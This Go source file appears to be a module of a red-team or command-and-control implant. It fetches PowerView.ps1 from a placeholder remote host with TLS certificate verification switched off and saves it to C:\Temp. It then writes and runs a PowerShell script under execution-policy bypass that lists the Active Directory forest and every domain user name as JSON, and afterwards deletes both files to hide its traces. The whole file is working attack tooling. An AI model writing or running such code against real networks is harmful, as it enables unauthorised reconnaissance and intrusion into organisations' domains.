package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
)

var TempDir = "C:\\Temp"

func GETHELPER(helper string, filePath string) error {
	jobUuid := os.Args[1]
	req, err := http.NewRequest("GET", "https://HOST:PORT/helpers/"+jobUuid+"/"+helper, nil)
	if err != nil {
		return err
	}
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	respBody, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		return err
	}
	err = WRITETOFILE(filePath, string(respBody))
	if err != nil {
		return err
	}
	return nil
}

func WRITETOFILE(filePath string, data string) error {
	err := os.MkdirAll(TempDir, os.ModePerm)
	if err != nil {
		return err
	}
	file, err := os.Create(filePath)
	if err != nil {
		return err
	}
	defer file.Close()
	_, err = io.WriteString(file, data)
	if err != nil {
		return err
	}
	return file.Sync()
}

func RUNPOWERVIEW() {
	var PowerViewFullPath = TempDir + "\\" + "POWERVIEWFILENAME.ps1"
	err := GETHELPER("PowerView.ps1", PowerViewFullPath)
	if err != nil {
		fmt.Println(err)
	}
	powershellPayload := `
Import-Module C:\Temp\POWERVIEWFILENAME.ps1

$Output = @{}
$Output.add("Users", @())

$Domain = Get-NetDomain | Select Forest
if ($Domain.Length -ne 0) {
Write-Output "Found domain"
$Output.add("Domain", $Domain)
} else {
Write-Output "Something wrong. Domain not found."
}

$Users = (Get-NetUser -Identity *).name
if ($Users.Length -ne 0) {
Write-Output "Found users"
$Output["Users"] += $Users
} else {
Write-Output "Something wrong. Users not found."
}

Write-Output "Result in JSON:"
Write-Output $Output | ConvertTo-Json
`
	var PowerShellPayloadFullPath = TempDir + "\\" + "SCRIPTFILENAME.ps1"
	err = WRITETOFILE(PowerShellPayloadFullPath, powershellPayload)
	if err != nil {
		fmt.Printf("%s\n", err)
	}
	powershellOut, err := exec.Command("powershell", "-ep", "bypass", PowerShellPayloadFullPath).Output()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(powershellOut))
	err = os.Remove(PowerViewFullPath)
	if err != nil {
		fmt.Println(err)
	}
	err = os.Remove(PowerShellPayloadFullPath)
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	RUNPOWERVIEW()
}
